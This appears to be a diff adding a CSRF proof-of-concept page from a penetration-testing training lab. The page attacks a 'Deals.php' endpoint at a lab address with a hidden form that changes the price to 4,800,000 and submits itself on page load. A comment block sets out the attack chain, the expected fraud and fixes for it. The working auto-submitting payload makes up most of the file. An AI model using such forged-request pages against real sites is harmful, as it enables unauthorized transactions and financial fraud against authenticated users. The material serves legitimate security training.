@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PWNEDsteps — CSRF PoC (Parameter Tampering)</title>
+    <style>
+        /* Minimal styling to indicate the attack in progress */
+        body {
+            font-family: monospace;
+            background-color: #000;
+            color: #0f0;
+            padding: 40px;
+            text-align: center;
+        }
+        .status {
+            margin-top: 50px;
+            font-size: 1.2em;
+        }
+    </style>
+</head>
+<body>
+    <!--
+    ========================================================================
+    PWNEDsteps Web Application Penetration Test — CSRF Proof of Concept
+    
+    Purpose:
+        Demonstrate parameter tampering and CSRF vulnerability in the
+        CyberStepsVuln /Deals.php financial transaction endpoint.
+    
+    Attack Vector:
+        1. Victim is authenticated to CyberStepsVuln (active session cookies).
+        2. Victim visits this malicious page (phishing link or compromised site).
+        3. Auto-submit form silently sends POST request with manipulated price.
+        4. Transaction is processed as if initiated by the authenticated victim.
+    
+    Vulnerability Chain:
+        - Missing anti-CSRF tokens on state-changing POST request
+        - Server validates no origin/referrer headers
+        - Price parameter not validated against database record
+        - Client-side only extension/content validation
+    
+    Impact:
+        Unauthorized transactions, financial fraud, account depletion.
+    
+    Remediation:
+        - Implement synchronizer token pattern (anti-CSRF tokens)
+        - Validate all monetary parameters server-side against DB records
+        - Use SameSite cookie attribute on session cookies
+        - Require re-authentication for high-value transactions
+    
+    Author: e-Itohan
+    Context: CyberSteps Training Program Lab Environment (10.10.10.10)
+    License: MIT — Educational use ONLY in authorized lab environments
+    
+    ⚠️ WARNING: This file is a proof-of-concept for educational purposes ONLY.
+    Do NOT deploy this code against systems you do not own or have explicit
+    written permission to test. Unauthorized access is illegal in most
+    jurisdictions.
+    ========================================================================
+    -->
+    
+    <!-- Malicious form targeting the Deals.php transaction endpoint -->
+    <form id="autosubmit" action="http://10.10.10.10/Deals.php" method="POST">
+        <!-- Original price (presumably $100) manipulated to $4,800,000 -->
+        <input type="text" name="money" style="display:none;" value="4800000">
+    </form>
+    
+    <!-- Status indicator for demonstration purposes -->
+    <div class="status">
+        [CSRF PoC] Redirecting to target endpoint...<br>
+        <small>(In lab environment: check browser console for network tab)</small>
+    </div>
+    
+    <script>
+        /**
+         * Auto-submit the CSRF payload on page load.
+         * In actual attack: victim's session cookies auto-attach to request.
+         */
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById("autosubmit").submit();
+            
+            // Log for demonstration/debugging (visible in browser console)
+            console.log('[*] CSRF PoC triggered');
+            console.log('[*] Target:', 'http://10.10.10.10/Deals.php');
+            console.log('[*] Payload:', { money: '4800000' });
+        });
+    </script>
+</body>
+</html>
